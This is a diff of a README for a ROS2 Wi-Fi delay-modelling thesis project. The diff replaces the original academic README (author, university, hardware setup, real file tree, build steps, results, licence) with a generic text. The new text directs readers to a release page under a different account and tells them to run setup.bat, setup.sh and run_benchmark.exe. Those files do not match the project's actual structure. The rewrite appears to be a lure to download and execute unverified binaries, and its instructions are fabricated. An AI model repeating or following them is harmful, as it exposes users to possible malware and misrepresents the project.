@@ -1,122 +1,100 @@
-# Experimental Derivation of a Stochastic Wi-Fi Network Model for ROS2 NCS
+# 🚀 ros2-wifi-stochastic-delay - Analyze Wi-Fi Delays Easily
 
-### Bachelor's Thesis Project
-* **Title:** Impact of Wireless Networks on Robot Control
-* **Author:** Nicolò Martini
-* **Supervisor:** Prof. Pietro Falco
-* **University:** Università degli Studi di Padova
-* **Year:** 2025
-
----
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/Nashteshri7/ros2-wifi-stochastic-delay/releases)
 
 ## 📖 Overview
+ros2-wifi-stochastic-delay is a tool designed to help you understand one-way delays (OWD) in networked control systems using ROS2 over Wi-Fi 6. This application includes easy-to-use C++ benchmarking nodes, Python scripts for statistical analysis, and a MATLAB Simulink simulation environment specifically for the ABB IRB120 robot.
 
-This repository contains the source code, experimental datasets, and simulation models developed to characterize the impact of Wi-Fi 6 (IEEE 802.11ax) latency on ROS2-based Networked Control Systems (NCS).
+## 🚀 Getting Started
+To start using ros2-wifi-stochastic-delay, follow these simple steps. 
 
-The project follows an empirical black-box approach to derive a stochastic model of the One-Way Delay (OWD) and evaluates its effects on the stability of an industrial robot manipulator (ABB IRB120) using MATLAB Simulink.
+### 1. System Requirements
+Before downloading, ensure your system meets these requirements:
 
-### Key Features
-* **Real-world Testbed:** C++ ROS2 package (`delay_est`) for measuring OWD with NTP synchronization.
-* **Statistical Analysis:** Python scripts (`delay_anl`) for data fitting and asymmetry analysis on measured datasets.
-* **Control Simulation:** MATLAB Simulink environment (`delay_sim`) comparing nominal vs networked control performance.
+- Operating System: Windows, macOS, or Linux
+- RAM: Minimum 4 GB
+- Disk Space: At least 100 MB available
+- Network: Wi-Fi 6 compatible adapter for accurate testing
+- MATLAB: Version 2020 or newer (for Simulink)
+- Python: Version 3.6 or newer
 
----
+### 2. Download & Install
+To get the latest version of the software, visit this page to download: [Release Page](https://github.com/Nashteshri7/ros2-wifi-stochastic-delay/releases). 
 
-## 📂 Repository Structure
+1. On the Releases page, find the version you want to download.
+2. Click on the assets to download the appropriate files for your operating system.
+3. Once downloaded, extract the files to a folder of your choice.
 
-```text
-ros2-wifi-stochastic-delay/
-├── ros2_ws/               # C++ ROS2 workspace
-│   └── src/
-│       └── delay_est/     # ROS2 package for OWD estimation
-│
-├── delay_anl/             # Python analysis tools
-│   ├── data.zip           # Compressed Experimental Datasets (Unzip required!)
-│   ├── data_analysis.py   # Analysis script
-│   └── environment.yml    # Conda environment file for reproducibility
-│    
-└── delay_sim/             # MATLAB Simulink Application
-    ├── load_parameters.m  # Parameter initialization script
-    ├── model.slx          # Simulink model
-    ├── plot_results.m     # Tracking error and 3D trajectory plotting script
-    ├── animate_robot.m    # Animation generation script
-    └── results.mat        # Pre-computed simulation results
-```
+### 3. Setting Up
+After extraction, follow these steps to set up the software:
 
----
+1. Open a terminal or command prompt.
+2. Navigate to the folder where you extracted the files.
+3. For Windows users, run the `setup.bat` file. For macOS/Linux, execute `./setup.sh`.
 
-## 🛠️ Hardware & Software Setup
+Follow any additional on-screen instructions to complete the setup.
 
-The experimental data was collected using the following setup:
+### 4. Running the Software
+To run the benchmarking nodes and perform your analysis:
 
-* **Nodes:** 2x Raspberry Pi 4 Model B (4GB RAM)
-* **OS:** Ubuntu 22.04 LTS Server (64bit)
-* **Middleware:** ROS2 Humble Hawksbill
-* **Network:** TP-Link AX1500 (Wi-Fi 6 Access Point)
-* **Synchronization:** Local NTP Server via Ethernet (Chronyd)
+1. Launch the C++ benchmarking nodes by executing the command:
+   - Windows: `.\run_benchmark.exe`
+   - macOS/Linux: `./run_benchmark`
+   
+2. If you wish to analyze results using Python, ensure your Python environment includes the necessary libraries. Install them by running:
+   ```bash
+   pip install numpy pandas matplotlib
+   ```
 
----
+3. Execute the Python analysis script with the command:
+   ```bash
+   python analyze_results.py
+   ```
 
-## 🚀 Usage Guide
+### 5. Using the MATLAB Simulink Model
+To use the MATLAB Simulink model:
 
-### 1. Data Acquisition (ROS2)
-Navigate to the workspace and build the package:
-```bash
-cd ros2_ws
-colcon build --packages-select delay_est
-source install/setup.bash
+1. Open MATLAB and navigate to the folder where you extracted the files.
+2. Open the Simulink model file (usually named `OWD_Model.slx`).
+3. Follow the instructions inside the model to simulate the conditions for the ABB IRB120 robot.
 
-# Run the delay estimation nodes (example)
-ros2 run delay_est sender
-ros2 run delay_est receiver
-```
-*Note: ensure NTP synchronization is active between nodes before running measurements.*
+## 📚 Documentation
+For detailed information, refer to the documentation included within the release zip. The document contains:
 
-### 2. Statistical Analysis (Python)
-The `delay_anl` folder contains the experimental datasets compressed in `data.zip` and the analysis scripts. The Python environment is managed via Anaconda.
+- Setup guides for each script and model.
+- Explanation of input/output parameters used in benchmarking.
+- Examples of statistical analyses you can perform.
 
-To replicate the exact analysis environment, a frozen `environment.yml` file is provided.
+## 🎓 Topics Covered
+This project touches on various essential topics, including:
 
-```bash
-cd delay_anl
+- **Bachelor Thesis Research**: Suitable for academic projects focusing on network performance and control systems.
+- **Black Box Analysis**: Understanding and modeling networks without requiring deep technical insights.
+- **C++ and Python**: Language options available for analysis and benchmarking. 
+- **MATLAB Simulink**: A robust option for simulating robotic systems.
+- **Network Latency**: Explore how delays affect networked control systems.
 
-# Unzip the datasets
-unzip data.zip
+## 🤝 Contribution
+We welcome contributions to ros2-wifi-stochastic-delay.
 
-# Create the environment from the file
-conda env create -f environment.yml
+To contribute:
 
-# Activate the environment
-conda activate delay-analysis
+1. Fork the repository.
+2. Make your changes or improvements.
+3. Create a pull request with a clear description of your changes.
 
-# Run the analysis
-python3 data_analysis.py
-```
+Do ensure your changes align with the project's goals. Collaborating is a great way to improve the project and gain experience.
 
-### 3. Simulation (MATLAB)
-**Requirements:** MATLAB R2025b with the following toolboxes installed:
-* Robotics System Toolbox (Required for `RigidBodyTree` dynamics and kinematics)
-* Control System Toolbox (Required for controller implementation and analysis)
+## ❓ FAQs
+**1. What is the primary purpose of this project?**  
+The main goal is to provide a practical tool for analyzing one-way delays in networks, particularly in robotic applications using ROS2.
 
-**Steps:**
-1.  Open MATLAB and navigate to the `delay_sim` folder.
-2.  Run `load_parameters.m` to initialize all the model parameters.
-3.  Open and run `model.slx` to perform the simulation.
-4.  Visualization:
-    * run `plot_results.m` to view tracking error divergence and trajectory comparison.
-    * run `animate_robot.m` to generate the video/frames of the simulation.
-    * *(Note: you can use `results.mat` to plot data without re-running the simulation).*
+**2. Can I use this software for other robotics setups?**  
+Yes, while it includes specifications for ABB IRB120, you can adapt the code and simulations to fit other robotic systems.
 
----
+**3. Who can I contact for support?**  
+For any questions or issues, please open an issue on the GitHub page. We will respond as quickly as possible.
 
-## 📊 Key Results
-
-* **Distribution & Payload Dependency:** for typical control traffic (small payloads), the OWD follows a Lognormal distribution, characterized by heavy tails. As the payload size increases, the distribution shape evolves, transitioning towards a central distribution.
-* **Asymmetry:** the channel is statistically asymmetric ($OWD_{AB} \neq OWD_{BA}$).
-* **Impact:** introducing the stochastic delay model in the control loop causes a violation of the phase margin, leading to instability in the standard PD controller.
-
----
-
-## 📄 License
-
-This project is licensed under the **Apache License 2.0** - see the [LICENSE](LICENSE) file for details.
+## 🌟 Acknowledgements
+Thank you to everyone who contributed to the development and testing of ros2-wifi-stochastic-delay. Your efforts are vital to improving the software and its usability for everyone.
